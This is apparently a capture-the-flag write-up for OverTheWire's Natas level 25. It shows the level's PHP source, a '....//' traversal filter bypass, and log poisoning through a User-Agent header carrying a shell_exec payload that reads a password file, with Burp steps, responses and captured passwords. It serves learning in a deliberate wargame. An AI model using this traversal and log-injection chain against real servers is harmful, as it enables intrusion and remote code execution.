# Natas Level 24 → Level 25 PHP Local File Inclusion (LFI) via lang parameter & Log File Injection (Log Poisoning)

## Previous Flag
<b>ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</b>

![alt text](/static/natas25.png "natas25 Quote")

## Goal
Username: natas25<br>
URL: http://natas25.natas.labs.overthewire.org<br>

## What I learned
```
Google: str_replace php bypass github
https://saurabhmittal16.github.io/posts/2021/04/hack-the-box-cyber-apocalypse-ctf-21/

Writeup: https://github.com/m3ssap0/CTF-Writeups/blob/master/35C3%20Junior%20CTF/flags/README.md?ref=learnhacking.io
    str_replace("../","",$filename)
    ....// will remove ../ and leave us w/ ../
```

## Solution
```
View source code
http://natas25.natas.labs.overthewire.org/index-source.html

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "<censored>" };</script></head>
<body>
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){ 👀 Tries to prevent directory traversal
        // check for directory traversal
        if(strstr($filename,"../")){ 👀 password may be in /etc/natas_webpass/natas26
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    # Called when fail one of the checks and logs it
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]"; 👀 creates date obj
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a"); 👀 log to dir
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php  
    session_start();
    setLanguage();
    
    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
<p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

# Navigation to etc/passwd works, 5 directory to go to var so 5 to get to etc
Browser: http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//etc/passwd

# GET PHPSESSID
F12 → Application
Storage → Cookies

Name            Value
PHPSESSID       ccala8cot4ht2afb2f249v08f8 ❤️

# Bypassing natas_webpass check
# Browser: http://natas25.natas.labs.overthewire.org/?lang=....//
# Note: No control over server variables
Warning: include(/var/www/natas/natas25): failed to open stream: No such file or directory in /var/www/natas/natas25/index.php on line 38

Warning: include(): Failed opening 'language/../' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas25/index.php on line 38

Notice: Undefined variable: __GREETING in /var/www/natas/natas25/index.php on line 80
Notice: Undefined variable: __MSG in /var/www/natas/natas25/index.php on line 81
Notice: Undefined variable: __FOOTER in /var/www/natas/natas25/index.php on line 82

# Peek into log w/ PHPSESSID ccala8cot4ht2afb2f249v08f8 (Note: Need to redo in Burp Browser diff PHPSESSID)
Browser: http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_ccala8cot4ht2afb2f249v08f8.log

# Open Burp Suite and change User-Agent to a command injection
# Burp Suite: Tempory project in memory: Use Burp defaults
# Proxy: Open browser: http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_ccala8cot4ht2afb2f249v08f8.log
# Proxy: Intercept On and refresh Burp Browser
# Right click request and Send to Repeater
# Repeater edit User-Agent
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
    User-Agent: <?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>
# Send
# Look at Response
HTTP/1.1 200 OK
Date: Thu, 07 Aug 2025 03:16:48 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1874
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" };</script></head>
<body>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

[07.08.2025 03::06:59] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 "Directory traversal attempt! fixing request."
[07.08.2025 03::11:33] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE 🔐
 "Directory traversal attempt! fixing request."
[07.08.2025 03::16:48] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE 🔐
 "Directory traversal attempt! fixing request."
<br />
<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
<h2></h2><br />
<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
<p align="justify"><br />
<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
<div align="right"><h6></h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Flag
<b>cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE</b>

## Continue
[Continue](/overthewire/Natas2526.md)